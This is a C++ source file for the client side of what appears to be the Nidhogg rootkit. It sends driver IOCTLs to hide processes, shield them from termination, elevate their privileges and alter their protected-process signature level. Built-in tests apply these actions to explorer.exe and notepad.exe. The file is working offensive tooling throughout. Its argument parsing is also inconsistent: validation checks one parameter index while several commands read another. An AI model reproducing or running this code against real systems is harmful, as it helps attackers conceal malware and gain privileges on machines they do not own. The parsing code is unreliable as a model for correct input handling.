#include "pch.h"
#include "ProcessHandler.h"

ProcessHandler::ProcessHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Process", hNidhogg) {
	testHiddenProcessPid = 0;

	this->tests = {
		{"protect", { true, [](PVOID tester) {
			DWORD pid = 0;
			try {
				pid = FindPidByName("explorer.exe");
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			return static_cast<ProcessHandler*>(tester)->Protect(pid, true);
			} } },
		{"list_protected", { true, [](PVOID tester) {
			try {
				std::vector<DWORD> result = static_cast<ProcessHandler*>(tester)->ListProcesses(ProcessType::Protected);
				std::cout << "[+] Protected processes:" << std::endl;
				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			return true;
			} } },
		{"unprotect", { true, [](PVOID tester) {
			DWORD pid = 0;
			try {
				pid = FindPidByName("explorer.exe");
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			return static_cast<ProcessHandler*>(tester)->Protect(pid, false);
			} } },
		{"hide", { false, [](PVOID tester) {
			DWORD pid = 0;
			try {
				pid = CreateProcessByName("notepad.exe");
			}
			catch (const ProcessHelperException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			static_cast<ProcessHandler*>(tester)->testHiddenProcessPid = pid;
			return static_cast<ProcessHandler*>(tester)->Hide(pid, true);
			} } },
		{"list_hidden", { false, [](PVOID tester) {
			try {
				std::vector<DWORD> result = static_cast<ProcessHandler*>(tester)->ListProcesses(ProcessType::Hidden);
				std::cout << "[+] Hidden processes:" << std::endl;
				for (int i = 0; i < result.size(); i++) {
					std::cout << "\t" << result[i] << std::endl;
				}
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			return true;
			} } },
		{"unhide", { false, [](PVOID tester) {
			if (static_cast<ProcessHandler*>(tester)->testHiddenProcessPid == 0) {
				std::cerr << "No hidden process to unhide" << std::endl;
				return false;
			}
			bool success = static_cast<ProcessHandler*>(tester)->Hide(static_cast<ProcessHandler*>(tester)->testHiddenProcessPid, false);
			static_cast<ProcessHandler*>(tester)->testHiddenProcessPid = 0;
			KillProcessByName("notepad.exe");
			return success;
			} } },
		{"elevate", { false, [](PVOID tester) {
			DWORD pid = 0;
			try {
				pid = CreateProcessByName("notepad.exe");
			}
			catch (const ProcessHelperException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			bool success = static_cast<ProcessHandler*>(tester)->Elevate(pid);
			KillProcessByName("notepad.exe");
			return success;
			} } },
		{"set_protection", { false, [](PVOID tester) {
			DWORD pid = 0;
			try {
				pid = CreateProcessByName("notepad.exe");
			}
			catch (const ProcessHelperException& e) {
				std::cerr << e.what() << std::endl;
				return false;
			}
			UCHAR signerType = PsProtectedTypeProtected;
			UCHAR signatureSigner = PsProtectedSignerWindows;
			bool success = static_cast<ProcessHandler*>(tester)->SetProtection(pid, signerType, signatureSigner);

			if (success) {
				signerType = PsProtectedTypeNone;
				signatureSigner = PsProtectedSignerNone;
				success = static_cast<ProcessHandler*>(tester)->SetProtection(pid, signerType, signatureSigner);
			}
			KillProcessByName("notepad.exe");
			return success;
			} } },
		{"clear_hidden", { true, [](PVOID tester) {
			return static_cast<ProcessHandler*>(tester)->ClearProcesses(ProcessType::Hidden);
			} } },
		{"clear_protected", { true, [](PVOID tester) {
			return static_cast<ProcessHandler*>(tester)->ClearProcesses(ProcessType::Protected);
			} } },
		{"clear_all", { true, [](PVOID tester) {
			return static_cast<ProcessHandler*>(tester)->ClearProcesses(ProcessType::All);
			} } }
	};
}

/*
* Description:
* HandleCommand is responsible for handling a process related command.
*
* Parameters:
* @command [_In_ std::string] -- The command to be handled.
*
* Returns:
* There is no return value.
*/
void ProcessHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("add") == 0 || commandName.compare("protect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		Protect(pid, true) ? std::cout << "Process " << pid << " protected" << std::endl :
			std::cerr << "Failed to protect process " << pid << std::endl;
	}
	else if (commandName.compare("remove") == 0 || commandName.compare("unprotect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Protect(pid, false) ? std::cout << "Removed protection for process " << pid << std::endl :
			std::cerr << "Failed to remove protection for process " << pid << std::endl;
	}
	else if (commandName.compare("hide") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(pid, true) ? std::cout << "Process " << pid << " is now hidden" << std::endl :
			std::cerr << "Failed to hide process " << pid << std::endl;
	}
	else if (commandName.compare("unhide") == 0 || commandName.compare("restore") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(pid, false) ? std::cout << "Process " << pid << " is now revealed" << std::endl :
			std::cerr << "Failed to reveal process " << pid << std::endl;
	}
	else if (commandName.compare("elevate") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Elevate(pid) ? std::cout << "Process " << pid << " elevated" << std::endl :
			std::cerr << "Failed to elevate process " << pid << std::endl;
	}
	else if (commandName.compare("list") == 0) {
		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		std::string processType = params.at(1);

		if (processType.compare("hidden") == 0) {
			std::vector<DWORD> result;

			try {
				result = ListProcesses(ProcessType::Hidden);
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return;
			}

			std::cout << "[+] Hidden processes:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else if (processType.compare("protected") == 0) {
			std::vector<DWORD> result;

			try {
				result = ListProcesses(ProcessType::Protected);
			}
			catch (const ProcessHandlerException& e) {
				std::cerr << e.what() << std::endl;
				return;
			}

			std::cout << "[+] Protected processes:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else if (commandName.compare("set_protection") == 0) {
		if (params.size() != 4) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		UCHAR signerType = static_cast<UCHAR>(atoi(params.at(2).c_str()));
		UCHAR signatureSigner = static_cast<UCHAR>(atoi(params.at(3).c_str()));

		if ((signerType < PsProtectedTypeNone || signerType > PsProtectedTypeProtected) ||
			(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
			std::cerr << "Invalid signer type or signature signer" << std::endl;
			PrintHelp();
			return;
		}

		SetProtection(pid, signerType, signatureSigner) ? std::cout << "Process " << pid << " signature level changed (type: " 
			<< signerType << ", signer: " << signatureSigner << ")" << std::endl :
			std::cerr << "Failed to change process " << pid << " signature level" << std::endl;
	}
	else if (commandName.compare("clear") == 0) {
		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}

		std::string processType = params.at(0);

		if (processType.compare("all") == 0) {
			ClearProcesses(ProcessType::All) ? std::cout << "All processes cleared" << std::endl :
				std::cerr << "Failed to clear all processes" << std::endl;
		}
		else if (processType.compare("hidden") == 0) {
			ClearProcesses(ProcessType::Hidden) ? std::cout << "Hidden processes cleared" << std::endl :
				std::cerr << "Failed to clear hidden processes" << std::endl;
		}
		else if (processType.compare("protected") == 0) {
			ClearProcesses(ProcessType::Protected) ? std::cout << "Protected processes cleared" << std::endl :
				std::cerr << "Failed to clear protected processes" << std::endl;
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else {
		std::cerr << "Invalid option!" << std::endl;
		PrintHelp();
	}
}

/*
* Description:
* CheckInput is responsible for checking the input parameters for the process commands.
* 
* Parameters:
* @params [_In_ const std::vector<std::string>&] -- The input parameters to be checked.
* 
* Returns:
* @bool											 -- Whether the input parameters are valid or not.
*/
bool ProcessHandler::CheckInput(_In_ const std::vector<std::string>& params) {
	if (params.size() != 2) {
		std::cerr << "Invalid usage" << std::endl;
		return false;
	}
	return IsValidPid(params.at(1));
}

/*
* Description:
* Protect is responsible for issuing a IOCTL_PROTECT_UNPROTECT_PROCESS to protect or unprotect a process.
*
* Parameters:
* @pid	   [_In_ DWORD] -- The process id to be protected or unprotected.
* @protect [_In_ bool]  -- Whether to protect or unprotect the process.
*
* Returns:
* @bool					-- Whether the operation was successful or not.
*/
bool ProcessHandler::Protect(_In_ DWORD pid, _In_ bool protect) {
	DWORD returned;
	IoctlProcessEntry protectedProcess = { pid, protect };

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_PROCESS, &protectedProcess, sizeof(protectedProcess),
		nullptr, 0, &returned, nullptr);
}

/*
* Description:
* Hide is responsible for issuing a IOCTL_HIDE_UNHIDE_PROCESS to hide or unhide a process.
*
* Parameters:
* @pid	[_In_ DWORD] -- The process id to be hidden or unhidden.
* @hide [_In_ bool]  -- Whether to hide or unhide the process.
*
* Returns:
* @bool				 -- Whether the operation was successful or not.
*/
bool ProcessHandler::Hide(_In_ DWORD pid, _In_ bool hide) {
	DWORD returned;
	IoctlProcessEntry hiddenProcess = { pid, hide };

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_PROCESS, &hiddenProcess, sizeof(hiddenProcess), nullptr, 0,
		&returned, nullptr);
}

/*
* Description:
* Elevate is responsible for issuing a IOCTL_ELEVATE_PROCESS to elevate a process.
*
* Parameters:
* @pid [_In_ DWORD] -- The process id to be elevated.
*
* Returns:
* @bool				-- Whether the operation was successful or not.
*/
bool ProcessHandler::Elevate(_In_ DWORD pid) {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_ELEVATE_PROCESS, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* SetProtection is responsible for issuing a IOCTL_SET_PROCESS_SIGNATURE_LEVEL to change the process' signature level.
*
* Parameters:
* @pid			   [_In_ DWORD] -- The process id to be changed.
* @signerType	   [_In_ UCHAR] -- The signer type to be set.
* @signatureSigner [_In_ UCHAR] -- The signature signer to be set.
*
* Returns:
* @bool						    -- Whether the operation was successful or not.
*/
bool ProcessHandler::SetProtection(_In_ DWORD pid, _In_ UCHAR signerType, _In_ UCHAR signatureSigner) {
	DWORD returned;
	IoctlProcessSignature processSignature{};

	processSignature.Pid = pid;
	processSignature.SignerType = signerType;
	processSignature.SignatureSigner = signatureSigner;

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_SET_PROCESS_SIGNATURE_LEVEL, &processSignature, sizeof(processSignature),
		nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ClearProtectedProcesses is responsible for issuing a IOCTL_CLEAR_PROTECTED_PROCESS to clear all protected processes.
*
* Parameters:
* @type [_In_ ProcessType] -- The type of processes to be cleared (protected).
*
* Returns:
* @bool					   -- Whether the operation was successful or not.
*/
bool ProcessHandler::ClearProcesses(_In_ ProcessType type) {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESSES, &type, sizeof(type), nullptr, 0, &returned, nullptr);
}


/*
* Description:
* ListProcesses is responsible for issuing a IOCTL_LIST_PROCESSES to get all protected or hidden processes.
*
* Parameters:
* @type [_In_ ProcessType]   -- The type of processes to be listed.
*
* Returns:
* @pids [std::vector<DWORD>] -- Protected PIDS.
*/
std::vector<DWORD> ProcessHandler::ListProcesses(_In_ ProcessType type) {
	DWORD returned;
	std::vector<DWORD> pids{};
	IoctlProcessList result{};
	result.Type = type;

	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_LIST_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
		nullptr)) {
		return pids;
	}

	if (result.Count > 0) {
		try {
			result.Processes = SafeAlloc<unsigned long*>(result.Count * sizeof(ULONG));
		}
		catch (SafeMemoryException&) {
			throw ProcessHandlerException("Failed to allocate memory for process list");
		}

		for (ULONG i = 0; i < result.Count; i++)
			pids.push_back(result.Processes[i]);
		SafeFree(result.Processes);
	}
	return pids;
}